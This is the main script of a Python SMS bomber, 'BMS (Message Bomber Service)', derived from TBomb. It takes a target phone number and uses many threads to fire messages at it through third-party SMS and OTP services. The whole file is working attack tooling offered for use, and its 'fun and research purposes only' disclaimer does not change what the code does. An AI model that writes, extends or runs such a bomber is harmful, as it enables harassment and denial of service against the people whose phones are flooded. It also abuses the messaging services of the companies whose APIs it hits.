#!/usr/bin/python
# -*- coding: UTF-8 -*-
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider
from utils.more import readisdc, clr, check_intr, format_phone
import sys

mesgdcrt = MessageDecorator()
country_codes = readisdc()["isdcodes"]
__VERSION__ = "1.0.0"

def print_head():
    print("""
░▒▓███████▓▒░░▒▓██████████████▓▒░ ░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
                                                
BMS (Message Bomber Service)    :   https://github.com/h4jack/bms
                    [c] TBomb   :   https://github.com/TheSpeedX/TBomb

to get help:
    run: python bomber.py --help
""")

def get_phone_info(cc=None, target=None):
    while True:
        if cc is None:
            cc = input(mesgdcrt.CommandMessage("Enter your country code (Without +): ")).strip()
        cc = format_phone(cc)
            
        if not country_codes.get(cc):
            mesgdcrt.WarningMessage(f"The country code ({cc}) you entered is invalid or unsupported.")
            cc = None
            continue
        break
    while True:
        if target is None:
            target = input(mesgdcrt.CommandMessage(f"Enter the target number: +{cc} ")).strip()
        target = format_phone(target)
            
        if not (6 <= len(target) <= 11):
            mesgdcrt.WarningMessage(f"The phone number ({target}) you entered is invalid.")
            target = None
            continue
        break
    return cc, target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : +" + cc + " " + target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")


def workernode(cc, target, count, delay, max_threads):
    api = APIProvider(cc, target, delay=delay)
    clr()
    print_head()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target        : +" + cc + " " + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it.."))

    if not APIProvider.api_providers:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = [executor.submit(api.hit) for _ in range(count - success)]

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                print_head()
                pretty_print(cc, target, success, failed)

    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    sys.exit()

def parse_args():
    parser = argparse.ArgumentParser(description="A SMS bomber application", epilog='Coded by h4jack, APIs by SpeedX!!!')
    parser.add_argument("cc", metavar='CC', type=str, help="Country code (without +)")
    parser.add_argument("target", metavar='TARGET', type=str, help="Target phone number")
    parser.add_argument("-c", "--count", type=int, help="Number of SMS to send")
    parser.add_argument("-d", "--delay", type=float, help="Delay time between each SMS in seconds")
    parser.add_argument("-t", "--threads", type=int, help="Number of threads to use")
    parser.add_argument("-b", "--batch", action="store_true", help="Use default batch values (count=40, delay=0.5, threads=3)")
    parser.add_argument("-v", "--version", action="store_true", help="show current TBomb version")
    return parser.parse_args()

def take_other_details(type, message = "", cc=None, count=None):
    try:
        if type == "count":
            max_limit = 500 if cc == "91" else 100
            message = f"Enter number of SMS to send (Max {max_limit}): "
            count = int(input(mesgdcrt.CommandMessage(message)).strip())
            if count > max_limit or count <= 0:
                mesgdcrt.WarningMessage(f"You have requested {count} SMS")
                mesgdcrt.GeneralMessage(f"Automatically capping the value to {max_limit}")
                count = max_limit
            return count
        elif type == "delay":
            delay = float(input(mesgdcrt.CommandMessage(message)))
            if delay > 30 or delay <= 0:
                mesgdcrt.WarningMessage(f"Your requested {delay} delay time is invalid.")
                mesgdcrt.GeneralMessage(f"Automatically capping the value to 30")
            return max(1, min(delay, 30))  # Limit delay between 1 and 30 seconds
        elif type == "threads":
            max_thread_limit = min(count//10, 10)  # Recommended max threads for SMS
            max_thread_limit = max(max_thread_limit, 1)
            message = f"Enter Number of Threads (Recommended: {max_thread_limit}): "
            threads = int(input(mesgdcrt.CommandMessage(message)).strip())
            return max(1, min(threads, max_thread_limit))
    except KeyboardInterrupt:
        raise 
    except Exception:
        mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
        print()
        return None



def main(cc=None, target=None, count=None, delay=None, threads=None):
    try:
        clr()
        print_head()
        check_intr()
        cc, target = get_phone_info(cc, target)

        if count is None:
            count = take_other_details("count", cc=cc)

        if delay is None:
            delay = take_other_details("delay", "Enter delay time (in seconds): ")

        if threads is None:
            threads = take_other_details("threads", count=count)

        workernode(cc, target, count, delay, threads)
    except KeyboardInterrupt:
        print()
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()


if __name__ == "__main__":
    print_head()
    if(len(sys.argv) == 1):
        main()
    if sys.argv[1] in ['-v', '--version']:
        print("Version: " + __VERSION__)
        sys.exit(0)
    args = parse_args()
    try:
        if args.cc and args.target:
            cc, target = get_phone_info(args.cc, args.target)
        else:
            cc, target = get_phone_info()
    except KeyboardInterrupt:
        print()
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()

    if args.batch:
        main(cc, target, 40, 0.5, 3)

    if(args.count and args.delay and args.threads):
        count = args.count
        delay = args.delay
        threads = args.threads
        main(cc, target, count, delay, threads)
    else:
        main(cc, target)
